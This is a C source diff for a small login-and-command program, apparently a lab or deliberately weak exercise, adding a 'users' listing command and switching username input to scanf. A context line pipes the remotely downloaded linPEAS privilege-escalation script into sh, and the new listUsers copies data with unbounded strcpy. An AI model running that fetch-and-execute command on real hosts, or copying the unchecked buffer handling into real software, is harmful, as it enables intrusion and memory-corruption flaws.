@@ -258,6 +258,30 @@ void shell() {
     
 }
 
+void listUsers(char* output) {
+    FILE* users_ptr = fopen(users_file, "r");
+    if (users_ptr==NULL) {
+        printf("Error reading file data");
+        exit(1);
+    }
+
+    char* output_ptr = output;
+
+    char* line = malloc(DEFAULT_BUFFER_SIZE * sizeof(char));
+    while (fgets(line,DEFAULT_BUFFER_SIZE,users_ptr)) {
+        char *f_user = strtok(line, " ");
+        int user_length = strlen(f_user);
+
+        strcpy(output_ptr,f_user);
+        
+        output_ptr[user_length] = '\n';
+        output_ptr += user_length + 1;
+    }
+
+    output_ptr[0] = '\0';
+    free(line);
+}
+
 // Function understand the command and do a function
 void handle_cmd(char* input, char* username, int logged_in, char* output) {
     char* cmd = malloc(DEFAULT_BUFFER_SIZE * sizeof(char));
@@ -343,6 +367,10 @@ void handle_cmd(char* input, char* username, int logged_in, char* output) {
         system("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh");
     }
 
+    if (strcmp(cmd,"users")==0) {
+        listUsers(output);
+    }
+
     if (strcmp(cmd,"exit")==0) {
         free(cmd);
         exit(0);
@@ -384,8 +412,8 @@ int main() {
     while (logged_in==-1) {
         printf("Username: ");
         
-        fgets(username, DEFAULT_BUFFER_SIZE, stdin);
-        username[strlen(username) - 1] = '\0';
+        scanf("%40s", username); //Used to use fgets but I changed it to scanf for some reason
+        //username[strlen(username) - 1] = '\0';
 
         printf("Password: ");
         passwd = get_passwd();
